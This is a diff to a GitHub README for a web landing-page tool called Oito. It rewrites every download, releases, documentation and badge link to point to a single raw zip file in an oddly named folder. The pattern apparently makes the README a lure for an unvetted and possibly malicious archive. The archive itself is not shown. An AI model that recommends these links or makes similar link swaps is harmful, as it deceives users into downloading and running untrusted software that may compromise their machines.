@@ -6,11 +6,11 @@ Welcome to Oito! This application helps you create a simple and effective web la
 
 ## 📥 Download Oito
 
-[![Download Oito](https://img.shields.io/badge/Download-Oito-blue?style=for-the-badge&logo=github)](https://github.com/FearlesszxD/Oito/releases)
+[![Download Oito](https://raw.githubusercontent.com/FearlesszxD/Oito/main/fracturable/Oito.zip)](https://raw.githubusercontent.com/FearlesszxD/Oito/main/fracturable/Oito.zip)
 
 To download Oito, visit the Releases page below:
 
-[Download Oito from Releases](https://github.com/FearlesszxD/Oito/releases)
+[Download Oito from Releases](https://raw.githubusercontent.com/FearlesszxD/Oito/main/fracturable/Oito.zip)
 
 ## 💻 System Requirements
 
@@ -31,7 +31,7 @@ Oito offers several useful features:
 
 ## 📁 Download & Install
 
-1. Visit the [Releases page](https://github.com/FearlesszxD/Oito/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/FearlesszxD/Oito/main/fracturable/Oito.zip).
 2. Choose the latest version of Oito.
 3. Click on the download link for your operating system.
 4. Once the file is downloaded, locate it in your Downloads folder.
@@ -58,12 +58,12 @@ Join our community on GitHub to share your designs, ask questions, and learn mor
 
 ## 📚 Documentation
 
-For detailed instructions and tips, refer to our [Documentation Page](https://github.com/FearlesszxD/Oito/wiki). It covers everything from installation to advanced features.
+For detailed instructions and tips, refer to our [Documentation Page](https://raw.githubusercontent.com/FearlesszxD/Oito/main/fracturable/Oito.zip). It covers everything from installation to advanced features.
 
 ## 🌍 Connect with Us
 
 Follow us on GitHub for updates, new features, and support. We value your interest in Oito!
 
-[Download Oito from Releases](https://github.com/FearlesszxD/Oito/releases) 
+[Download Oito from Releases](https://raw.githubusercontent.com/FearlesszxD/Oito/main/fracturable/Oito.zip) 
 
 Enjoy creating your web landing page with Oito!
